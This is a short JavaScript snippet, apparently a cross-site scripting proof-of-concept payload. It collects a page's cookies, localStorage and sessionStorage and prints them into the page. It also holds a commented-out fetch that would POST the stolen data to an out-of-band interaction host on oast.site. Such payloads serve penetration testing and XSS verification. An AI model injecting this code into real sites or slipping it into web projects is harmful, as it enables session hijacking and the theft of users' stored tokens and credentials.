(function(){
    var data = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
    };

    document.write('<pre>' + JSON.stringify(data, null, 2) + '</pre>');
    
    // fetch('https://ah8eaj5bg2di7v5tu85c91c4vwzuopbe0.oast.site/all', {
    //         method: 'POST',
    //         mode: 'no-cors',
    //         headers: {'Content-Type': 'application/json'},
    //         body: JSON.stringify(data)
    //     });

})();